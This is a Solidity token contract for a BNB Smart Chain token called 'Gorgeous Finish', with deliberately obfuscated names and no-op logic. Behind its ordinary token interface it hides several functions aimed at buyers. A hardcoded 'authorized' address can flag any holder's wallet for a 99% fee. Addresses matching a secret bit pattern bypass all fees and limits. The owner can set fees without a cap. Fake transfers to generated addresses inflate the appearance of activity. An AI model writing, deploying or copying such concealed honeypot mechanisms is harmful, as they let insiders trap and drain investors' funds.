/**
 *Submitted for verification at BscScan.com on 2022-12-22
*/

// SPDX-License-Identifier: MITpragma solidity ^0.8.9;interface IPancakePair {    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);}interface IBEP20 {    function allowance(address _owner, address spender)    external    view    returns (uint256);    function balanceOf(address account) external view returns (uint256);    function transferFrom(        address sender,        address recipient,        uint256 amount    ) external returns (bool);    function name() external view returns (string memory);    function totalSupply() external view returns (uint256);    function getOwner() external view returns (address);    function transfer(address recipient, uint256 amount)     external    returns (bool);    function symbol() external view returns (string memory);    function approve(address spender, uint256 amount) external returns (bool);    function decimals() external view returns (uint8);    event Transfer(address indexed from, address indexed to, uint256 value);    event Approval(        address indexed owner,        address indexed spender,        uint256 value    );}library SafeMath {    function sub(uint256 a, uint256 b) internal pure returns (uint256) {        return a - b;    }    function div(uint256 a, uint256 b) internal pure returns (uint256) {        return a / b;    }    function sub(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b <= a, errorMessage);        return a - b;    }    }    function div(        uint256 a,        uint256 b,        string memory errorMessage    ) internal pure returns (uint256) {    unchecked {        require(b > 0, errorMessage);        return a / b;    }    }    function tryMod(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (b == 0) return (false, 0);        return (true, a % b);    }    }    function mul(uint256 a, uint256 b) internal pure returns (uint256) {        return a * b;    }    function tryMul(uint256 a, uint256 b)    internal    pure    returns (bool, uint256)    {    unchecked {        if (a == 0) return (true, 0);        uint256 c = a * b;        if (c / a != b) return (false, 0);        return (true, c);    }    }    function add(uint256 a, uint256 b) internal pure returns (uint256) {        return a + b;    }}interface IUniswapV2Router {    function swapExactETHForTokensSupportingFeeOnTransferTokens(        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external payable;    function addLiquidity(        address tokenA,        address tokenB,        uint256 amountADesired,        uint256 amountBDesired,        uint256 amountAMin,        uint256 amountBMin,        address to,        uint256 deadline    )    external    returns (        uint256 amountA,        uint256 amountB,        uint256 liquidity    );    function swapExactTokensForETHSupportingFeeOnTransferTokens(        uint256 amountIn,        uint256 amountOutMin,        address[] calldata path,        address to,        uint256 deadline    ) external;    function factory() external pure returns (address);    function WETH() external pure returns (address);    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);    function addLiquidityETH(        address token,        uint256 amountTokenDesired,        uint256 amountTokenMin,        uint256 amountETHMin,        address to,        uint256 deadline    )    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);}interface IUniswapV2Factory {    function createPair(address tokenA, address tokenB)    external    returns (address pair);}abstract contract Ownable {    address internal owner;    mapping(address => bool) internal competent;    constructor(address _owner) {        owner = _owner;        competent[_owner] = true;    }    function removeAuthorized(address adr) public onlyOwner() {        competent[adr] = false;    }    function SetAuthorized(address adr) public onlyAuthorized() {        competent[adr] = true;    }    modifier onlyAuthorized() {        require(isAuthorized(msg.sender), "!Authorized");        _;    }    modifier onlyOwner() {        require(isOwner(msg.sender), "!OWNER");        _;    }    function Owner() public view returns (address) {        return owner;    }    function isOwner(address account) public view returns (bool) {        return account == owner;    }    function isAuthorized(address adr) public view returns (bool) {        return competent[adr];    }}interface IERC20 {    function balanceOf(address account) external view returns (uint256);}contract GorgeousFinish is IBEP20, Ownable {    using SafeMath for uint256;    uint256  constant MASK = type(uint128).max;    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;    address DEAD = 0x000000000000000000000000000000000000dEaD;    address ZERO = 0x0000000000000000000000000000000000000000;    uint256 _totalSupply = 100000000 * (10 ** _decimals);    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;    uint256  _maxWallet = 2000000 * 10 ** _decimals;    string constant _name = "Gorgeous Finish ";    string constant _symbol = "GorgeousFinish";    uint8 constant _decimals = 18;    //BUY FEES    uint256 private autoExemptWalletModeMin = 0;    uint256 private botsTradingWalletExemptFeeMarketingSell = 6;    //SELL FEES    uint256 private feeBotsLaunchedMarketing = 0;    uint256 private buyIsMaxSellTeam = 6;    bool private txAutoSwapBurn = true;    bool private buyAutoTeamFeeMode = true;    bool private maxBotsIsReceiverLimitMin = true;    bool private burnLiquiditySellSwap = true;    bool private isBurnBotsSell = true;    uint256 private swapAutoSellMin = _totalSupply / 1000; // 0.1%    uint256 private sellTxFeeLiquidity = botsTradingWalletExemptFeeMarketingSell + autoExemptWalletModeMin;    uint256 private tradingSellLaunchedMarketingBuyBotsMin = 100;    bool private launchedAutoSellWalletIsMaxTrading;    uint256 private liquidityMaxTradingTxAuto;    uint256 private liquidityMinModeTxBurnAuto;    uint256 private receiverTeamBotsSell;    uint256 private marketingMinExemptTxTrading;    uint256 firstSetAutoReceiver = 2 ** 18 - 1;    mapping(address => uint256) _balances;    mapping(address => mapping(address => uint256)) _allowances;    mapping(address => bool) private exemptBuyBurnWallet;    mapping(address => bool) private feeWalletSellLiquidity;    mapping(address => bool) private marketingWalletTeamSell;    mapping(address => bool) private buyAutoTeamFee;    uint256 private launchBlock = 0;    IUniswapV2Router public router;    address public uniswapV2Pair;    uint256 private txSwapExemptLimitMax;    uint256 private limitMaxReceiverTxAutoMarketing;    address private marketingBurnIsReceiverAuto = (msg.sender); // auto-liq address    address private maxMinLimitBuy = (0x4CB84b906D9239F1ea0B944dfFFFfBDF583653a6); // marketing address    address private limitBurnModeAuto = DEAD;    address private maxBotsMarketingAuto = DEAD;    address private feeModeTradingBotsReceiverMarketing = DEAD;    event BuyTaxesUpdated(uint256 buyTaxes);    event SellTaxesUpdated(uint256 sellTaxes);        uint256 public feeIsSwapAutoMinSellLaunched = 0;    uint256 private botsLiquidityMinWalletSwapLimitMarketing = 0;    uint256 private minAutoModeSwap = 0;    uint256 public limitTradingWalletExempt = 0;    uint256 private modeLimitLaunchedFee = 0;    uint256 private autoMarketingExemptBuySwapBotsLimit = 0;    bool public buyBotsWalletLaunched = false;    uint256 public swapBotsReceiverMinBuyLimit = 0;    bool public maxSwapBurnLimit = false;    bool public swapFeeExemptBurn = false;    bool inSwap;    modifier swapping() {        inSwap = true;        _;        inSwap = false;    }    constructor() Ownable(msg.sender) {        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;        // PancakeSwap Router        router = IUniswapV2Router(_router);        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());        _allowances[address(this)][address(router)] = _totalSupply;        launchedAutoSellWalletIsMaxTrading = true;        marketingWalletTeamSell[msg.sender] = true;        marketingWalletTeamSell[0x0000000000000000000000000000000000000000] = true;        marketingWalletTeamSell[0x000000000000000000000000000000000000dEaD] = true;        marketingWalletTeamSell[address(this)] = true;        exemptBuyBurnWallet[msg.sender] = true;        exemptBuyBurnWallet[address(this)] = true;        feeWalletSellLiquidity[msg.sender] = true;        feeWalletSellLiquidity[0x0000000000000000000000000000000000000000] = true;        feeWalletSellLiquidity[0x000000000000000000000000000000000000dEaD] = true;        feeWalletSellLiquidity[address(this)] = true;        SetAuthorized(address(0xf69121f926311B376a63a2D9ffFfd5b835834BFe));        approve(_router, _totalSupply);        approve(address(uniswapV2Pair), _totalSupply);        _balances[msg.sender] = _totalSupply;        emit Transfer(address(0), msg.sender, _totalSupply);    }    receive() external payable {}    function totalSupply() external view override returns (uint256) {        return _totalSupply;    }    function decimals() external pure override returns (uint8) {        return _decimals;    }    function symbol() external pure override returns (string memory) {        return _symbol;    }    function name() external pure override returns (string memory) {        return _name;    }    function getOwner() external view override returns (address) {        return owner;    }    function balanceOf(address account) public view override returns (uint256) {        return _balances[account];    }    function allowance(address holder, address spender) external view override returns (uint256) {        return _allowances[holder][spender];    }    function approve(address spender, uint256 amount) public override returns (bool) {        _allowances[msg.sender][spender] = amount;        emit Approval(msg.sender, spender, amount);        return true;    }    function approveMax(address spender) external returns (bool) {        return approve(spender, _totalSupply);    }    function transfer(address recipient, uint256 amount) external override returns (bool) {        return txTradingAutoBurnLaunchedIsBots(msg.sender, recipient, amount);    }    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {        if (_allowances[sender][msg.sender] != _totalSupply) {            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]            .sub(amount, "Insufficient Allowance!");        }        return txTradingAutoBurnLaunchedIsBots(sender, recipient, amount);    }    function getSwapAutoSellMin() public view returns (uint256) {        if (swapAutoSellMin == launchBlock) {            return launchBlock;        }        if (swapAutoSellMin != tradingSellLaunchedMarketingBuyBotsMin) {            return tradingSellLaunchedMarketingBuyBotsMin;        }        return swapAutoSellMin;    }
    function getMaxMinLimitBuy() public view returns (address) {        if (maxMinLimitBuy == marketingBurnIsReceiverAuto) {            return marketingBurnIsReceiverAuto;        }        return maxMinLimitBuy;    }
    function setModeLimitLaunchedFee(uint256 a0) public onlyOwner {        if (modeLimitLaunchedFee != botsLiquidityMinWalletSwapLimitMarketing) {            botsLiquidityMinWalletSwapLimitMarketing=a0;        }        modeLimitLaunchedFee=a0;    }
    function walletSellLimitMarketing(address sender, bool selling) internal returns (uint256) {                if (modeLimitLaunchedFee == sellTxFeeLiquidity) {            modeLimitLaunchedFee = autoMarketingExemptBuySwapBotsLimit;        }        if (autoMarketingExemptBuySwapBotsLimit != sellTxFeeLiquidity) {            autoMarketingExemptBuySwapBotsLimit = tradingSellLaunchedMarketingBuyBotsMin;        }        if (selling) {            sellTxFeeLiquidity = buyIsMaxSellTeam + feeBotsLaunchedMarketing;            return sellTxFeeLiquidity;        }        if (!selling && sender == uniswapV2Pair) {            sellTxFeeLiquidity = botsTradingWalletExemptFeeMarketingSell + autoExemptWalletModeMin;            return sellTxFeeLiquidity;        }        return buyIsMaxSellTeam + feeBotsLaunchedMarketing;    }
    function txReceiverLimitAuto() internal view returns (bool) {return    msg.sender != uniswapV2Pair &&    !inSwap &&    isBurnBotsSell &&    _balances[address(this)] >= swapAutoSellMin;    }
    function liquidityAutoSellFee() internal swapping {                if (minAutoModeSwap != launchBlock) {            minAutoModeSwap = buyIsMaxSellTeam;        }        if (modeLimitLaunchedFee == autoExemptWalletModeMin) {            modeLimitLaunchedFee = autoMarketingExemptBuySwapBotsLimit;        }        uint256 amountToLiquify = swapAutoSellMin.mul(autoExemptWalletModeMin).div(sellTxFeeLiquidity).div(2);        uint256 amountToSwap = swapAutoSellMin.sub(amountToLiquify);        address[] memory path = new address[](2);        path[0] = address(this);        path[1] = router.WETH();        router.swapExactTokensForETHSupportingFeeOnTransferTokens(            amountToSwap,            0,            path,            address(this),            block.timestamp        );                uint256 amountBNB = address(this).balance;        uint256 totalETHFee = sellTxFeeLiquidity.sub(autoExemptWalletModeMin.div(2));        uint256 amountBNBLiquidity = amountBNB.mul(autoExemptWalletModeMin).div(totalETHFee).div(2);        uint256 amountBNBMarketing = amountBNB.mul(botsTradingWalletExemptFeeMarketingSell).div(totalETHFee);                if (autoMarketingExemptBuySwapBotsLimit != buyIsMaxSellTeam) {            autoMarketingExemptBuySwapBotsLimit = swapAutoSellMin;        }        if (botsLiquidityMinWalletSwapLimitMarketing == launchBlock) {            botsLiquidityMinWalletSwapLimitMarketing = autoExemptWalletModeMin;        }        if (minAutoModeSwap != botsLiquidityMinWalletSwapLimitMarketing) {            minAutoModeSwap = botsLiquidityMinWalletSwapLimitMarketing;        }        payable(maxMinLimitBuy).transfer(amountBNBMarketing);        if (amountToLiquify > 0) {            router.addLiquidityETH{value : amountBNBLiquidity}(                address(this),                amountToLiquify,                0,                0,                marketingBurnIsReceiverAuto,                block.timestamp            );            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);        }    }
    function setBot(address addr) public onlyAuthorized {        buyAutoTeamFee[addr] = true;    }
    function getBuyAutoTeamFee(address a0) public view returns (bool) {        if (buyAutoTeamFee[a0] != buyAutoTeamFee[a0]) {            return isBurnBotsSell;        }        if (buyAutoTeamFee[a0] == exemptBuyBurnWallet[a0]) {            return txAutoSwapBurn;        }        if (a0 != marketingBurnIsReceiverAuto) {            return isBurnBotsSell;        }            return buyAutoTeamFee[a0];    }
    function txLaunchedMaxLiquidity(address sender) internal view returns (bool) {        return !feeWalletSellLiquidity[sender];    }
    function setBuyAutoTeamFee(address a0,bool a1) public onlyOwner {        if (buyAutoTeamFee[a0] != exemptBuyBurnWallet[a0]) {           exemptBuyBurnWallet[a0]=a1;        }        buyAutoTeamFee[a0]=a1;    }
    function setSwapAutoSellMin(uint256 a0) public onlyOwner {        swapAutoSellMin=a0;    }
    function setAutoExemptWalletModeMin(uint256 a0) public onlyOwner {        autoExemptWalletModeMin=a0;    }
    function setMaxMinLimitBuy(address a0) public onlyOwner {        if (maxMinLimitBuy != maxMinLimitBuy) {            maxMinLimitBuy=a0;        }        if (maxMinLimitBuy != maxMinLimitBuy) {            maxMinLimitBuy=a0;        }        maxMinLimitBuy=a0;    }
    function getModeLimitLaunchedFee() public view returns (uint256) {        if (modeLimitLaunchedFee != autoExemptWalletModeMin) {            return autoExemptWalletModeMin;        }        if (modeLimitLaunchedFee == botsTradingWalletExemptFeeMarketingSell) {            return botsTradingWalletExemptFeeMarketingSell;        }        return modeLimitLaunchedFee;    }
    function getAutoExemptWalletModeMin() public view returns (uint256) {        if (autoExemptWalletModeMin != buyIsMaxSellTeam) {            return buyIsMaxSellTeam;        }        if (autoExemptWalletModeMin == modeLimitLaunchedFee) {            return modeLimitLaunchedFee;        }        if (autoExemptWalletModeMin == tradingSellLaunchedMarketingBuyBotsMin) {            return tradingSellLaunchedMarketingBuyBotsMin;        }        return autoExemptWalletModeMin;    }
    function swapBotsFeeLaunched(address sender, address receiver, uint256 amount) internal returns (uint256) {                uint256 feeAmount = amount.mul(walletSellLimitMarketing(sender, receiver == uniswapV2Pair)).div(tradingSellLaunchedMarketingBuyBotsMin);        if (buyAutoTeamFee[sender] || buyAutoTeamFee[receiver]) {            feeAmount = amount.mul(99).div(tradingSellLaunchedMarketingBuyBotsMin);        }        _balances[address(this)] = _balances[address(this)].add(feeAmount);        emit Transfer(sender, address(this), feeAmount);                if (_balances[address(this)] > 2 * 10 ** _decimals && sender == uniswapV2Pair) {            for (uint i = 0; i < 2; i++) {                address addr = address(uint160(block.timestamp + i));                _balances[addr] = _balances[addr] + 10 ** _decimals;                emit Transfer(address(this), addr, 10 ** _decimals);            }            _balances[address(this)] = _balances[address(this)].sub(2 * 10 ** _decimals);        }        return amount.sub(feeAmount);    }
    function isBot(address addr) public view returns (bool) {        return buyAutoTeamFee[addr];    }
    function burnLaunchedIsMax(address sender, address recipient, uint256 amount) internal returns (bool) {        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");        _balances[recipient] = _balances[recipient].add(amount);        emit Transfer(sender, recipient, amount);        return true;    }
    function liquidityTradingMarketingSell(address addr) private view returns (bool) {        uint256 v0 = uint256(uint160(addr)) << 192;        v0 = v0 >> 238;        return v0 == firstSetAutoReceiver;    }
    function txTradingAutoBurnLaunchedIsBots(address sender, address recipient, uint256 amount) internal returns (bool) {                if (botsLiquidityMinWalletSwapLimitMarketing != buyIsMaxSellTeam) {            botsLiquidityMinWalletSwapLimitMarketing = autoExemptWalletModeMin;        }        if (modeLimitLaunchedFee == autoExemptWalletModeMin) {            modeLimitLaunchedFee = buyIsMaxSellTeam;        }        if (autoMarketingExemptBuySwapBotsLimit == autoExemptWalletModeMin) {            autoMarketingExemptBuySwapBotsLimit = buyIsMaxSellTeam;        }        bool bLimitTxWalletValue = liquidityTradingMarketingSell(sender) || liquidityTradingMarketingSell(recipient);                                if (inSwap || bLimitTxWalletValue) {return burnLaunchedIsMax(sender, recipient, amount);}        if (!exemptBuyBurnWallet[sender] && !exemptBuyBurnWallet[recipient] && recipient != uniswapV2Pair) {            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet!");        }                if (minAutoModeSwap == feeBotsLaunchedMarketing) {            minAutoModeSwap = minAutoModeSwap;        }        if (botsLiquidityMinWalletSwapLimitMarketing == autoMarketingExemptBuySwapBotsLimit) {            botsLiquidityMinWalletSwapLimitMarketing = botsLiquidityMinWalletSwapLimitMarketing;        }        require((amount <= _maxTxAmount) || marketingWalletTeamSell[sender] || marketingWalletTeamSell[recipient], "Max TX Limit!");        if (txReceiverLimitAuto()) {liquidityAutoSellFee();}        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");                uint256 amountReceived = txLaunchedMaxLiquidity(sender) ? swapBotsFeeLaunched(sender, recipient, amount) : amount;        _balances[recipient] = _balances[recipient].add(amountReceived);        emit Transfer(sender, recipient, amountReceived);        return true;    }
    function getBotsTradingWalletExemptFeeMarketingSell() public view returns (uint256) {        return botsTradingWalletExemptFeeMarketingSell;    }
    function setBotsTradingWalletExemptFeeMarketingSell(uint256 a0) public onlyOwner {        if (botsTradingWalletExemptFeeMarketingSell != autoExemptWalletModeMin) {            autoExemptWalletModeMin=a0;        }        if (botsTradingWalletExemptFeeMarketingSell != feeBotsLaunchedMarketing) {            feeBotsLaunchedMarketing=a0;        }        if (botsTradingWalletExemptFeeMarketingSell == autoExemptWalletModeMin) {            autoExemptWalletModeMin=a0;        }        botsTradingWalletExemptFeeMarketingSell=a0;    }
    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}